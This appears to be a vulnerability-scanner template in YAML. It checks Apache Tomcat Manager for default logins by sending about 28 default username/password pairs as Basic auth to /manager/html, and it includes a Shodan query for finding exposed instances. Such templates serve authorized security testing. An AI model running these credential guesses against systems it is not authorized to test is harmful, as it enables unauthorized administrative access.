http:
- attack: pitchfork
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains_all(body, "Apache Tomcat", "Server Information")
    - contains_any(body, "Tomcat Version", "JVM Version", "JVM Vendor", "OS Name",
      "OS Version", "OS Architecture", "Hostname", "IP Address")
    type: dsl
  payloads:
    password:
    - tomcat
    - admin
    - manager
    - s3cret
    - changethis
    - tomcat
    - manager
    - role1
    - tomcat
    - root
    - r00t
    - tomcat
    - ADMIN
    - OvW*busr1
    - j2deployer
    - kdsxc
    - QLogic66
    - xampp
    - demo
    - owaspbwa
    - changethis
    - s3cret
    - changethis
    - Password1
    - vagrant
    - password
    - Password1
    - admin123
    username:
    - tomcat
    - admin
    - admin
    - admin
    - admin
    - admin
    - manager
    - role1
    - role1
    - root
    - root
    - both
    - ADMIN
    - ovwebusr
    - j2deployer
    - cxsdk
    - QCC
    - xampp
    - demo
    - server_admin
    - role
    - tomcat
    - tomcat
    - tomcat
    - vagrant
    - admin
    - admin
    - admin
  raw:
  - 'GET /manager/html HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic {{base64(username + '':'' + password)}}

    '
  stop-at-first-match: true
  threads: 30
id: tomcat-default-login
info:
  author: pdteam,sinKettu,nybble04
  classification:
    cpe: cpe:2.3:a:apache:tomcat:*:*:*:*:*:*:*:*
  description: Apache Tomcat Manager default login credentials were discovered.
  metadata:
    max-request: 25
    product: tomcat
    runzero-match: any(each(service["html.titles"]), {# matches "Apache Tomcat"})
    shodan-query: title:"Apache Tomcat"
    vendor: apache
  name: Apache Tomcat Manager Default Login
  reference:
  - https://www.rapid7.com/db/vulnerabilities/apache-tomcat-default-ovwebusr-password/
  - https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
  severity: high
  tags: apache,default-login,tomcat,vuln
